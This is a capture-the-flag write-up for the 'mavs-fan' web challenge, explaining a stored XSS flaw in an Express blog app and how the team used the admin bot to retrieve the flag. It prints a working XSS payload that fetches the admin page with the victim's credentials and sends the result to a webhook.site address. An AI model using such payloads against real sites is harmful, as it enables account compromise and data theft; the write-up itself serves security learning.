# mavs-fan writeups
### Team: UIT.4KySiNguLam

![image](https://github.com/user-attachments/assets/ca0fe3b8-4974-4569-a256-73a60f0ec078)

## Overview
Ok, so looking at this website, we see that it’s like a blogging / chat room website. There being an admin bot hints at this challenge being XSS-based.

![image](https://github.com/user-attachments/assets/5fa73e1c-5ed9-408c-ac5e-fba420902527)

## Vulnerability
- Let take a look at **app.js** code.

```javascript
app.post('/api/post', (req, res) => {
    const { message } = req.body;
    const newId = crypto.randomUUID();
    if (message) {
        posts.set(newId, {message: message, published: false});
    }
    return res.redirect(`/post/${newId}`);
});

app.get('/api/posts', (req, res) => {
    return res.json(publishedPosts);
});

app.get('/api/post/:id', (req, res) => {
    const post = posts.get(req.params.id);
    if (!post) return res.status(404).send('Post not found');
    return res.json(post);
});
```

- So we can basically just post things and we can clearly see that there is no XSS filter or any other protection.

## Exploitation

- Let try a simple XSS payload to test first.
```HTML
<img src=hehe onerror="alert('hehe')">
```

![image](https://github.com/user-attachments/assets/5e30c385-eab1-4bdc-975e-2ac7a066c744)
- It works~!
- Lemme see /admin code base.

```javascript
const FLAG = process.env.FLAG || 'lactf{test_flag}';
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'placeholder';

app.get('/admin', (req, res) => {
    if (!req.cookies.secret || req.cookies.secret !== ADMIN_SECRET) {
        return res.redirect("/");
    }
    return res.json({ trade_plan: FLAG });
});
```
- Because this is a XSS challenge, we can set up a **webhook.site**, then collect flag through js script by sending request to our **webhook** when we XSS.
- Here is the payload:
```HTML
<img src=hehe onerror="fetch('/admin', {credentials: 'include'})
  .then(response => response.json())
  .then(data => { 
    new Image().src = 'https://webhook.site/33b405ba-8b20-497a-9aea-917e2f20cf85?flag=' + data.trade_plan;
  });">
```
- Post it to web challenge then copy PostID URL to **admin bot**. Just get flag at **webhook**

![image](https://github.com/user-attachments/assets/71c86384-f50a-4f60-98eb-63c41ce7bcfd)
